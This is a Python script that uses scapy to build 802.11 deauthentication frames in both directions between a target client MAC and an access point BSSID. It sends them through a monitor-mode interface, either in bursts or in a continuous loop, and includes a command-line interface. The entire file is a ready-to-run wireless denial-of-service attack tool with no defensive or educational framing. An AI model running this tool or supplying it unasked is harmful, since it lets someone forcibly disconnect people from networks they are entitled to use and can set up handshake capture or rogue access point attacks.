"""
Wi-Fi Deauthentication Kicker — 802.11 Deauth Frame Sender
"""
import sys, time, signal, logging, argparse
logger = logging.getLogger(__name__)
DEAUTH_REASON = 7

class WifiKicker:
    def __init__(self, target_mac: str, bssid: str, interface: str = "wlan0mon"):
        self.target_mac = target_mac.upper()
        self.bssid = bssid.upper()
        self.interface = interface
        self.running = False
        self._kick_count = 0

    def _build_frames(self):
        from scapy.all import RadioTap, Dot11, Dot11Deauth
        f1 = RadioTap()/Dot11(addr1=self.target_mac, addr2=self.bssid, addr3=self.bssid)/Dot11Deauth(reason=DEAUTH_REASON)
        f2 = RadioTap()/Dot11(addr1=self.bssid, addr2=self.target_mac, addr3=self.bssid)/Dot11Deauth(reason=DEAUTH_REASON)
        return [f1, f2]

    def kick(self, burst: int = 64):
        from scapy.all import sendp
        frames = self._build_frames()
        logger.info(f"[DEAUTH] Sending {burst} frames to {self.target_mac} via {self.interface}")
        sendp(frames, iface=self.interface, count=burst, inter=0.05, verbose=False)
        self._kick_count += burst

    def start_continuous(self, burst: int = 10, interval: float = 0.5):
        self.running = True
        print(f"\n💀 Continuous deauth: {self.target_mac} ↔ {self.bssid}")
        print("Press Ctrl+C to stop.\n")
        while self.running:
            self.kick(burst=burst)
            print(f"\r   Frames sent: {self._kick_count}", end="", flush=True)
            time.sleep(interval)

    def stop(self):
        self.running = False
        print(f"\n🛑 Deauth stopped. Total frames: {self._kick_count}")


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(message)s")
    parser = argparse.ArgumentParser(description="Radar Wi-Fi Deauthenticator")
    parser.add_argument("target_mac")
    parser.add_argument("bssid")
    parser.add_argument("interface", nargs="?", default="wlan0mon")
    parser.add_argument("--continuous", action="store_true")
    parser.add_argument("--burst", type=int, default=64)
    args = parser.parse_args()
    kicker = WifiKicker(args.target_mac, args.bssid, args.interface)
    signal.signal(signal.SIGINT, lambda s, f: (kicker.stop(), sys.exit(0)))
    if args.continuous:
        kicker.start_continuous(burst=args.burst)
    else:
        print(f"\n💀 Sending {args.burst} deauth frames to {args.target_mac}...")
        kicker.kick(burst=args.burst)
        print("✅ Done.")
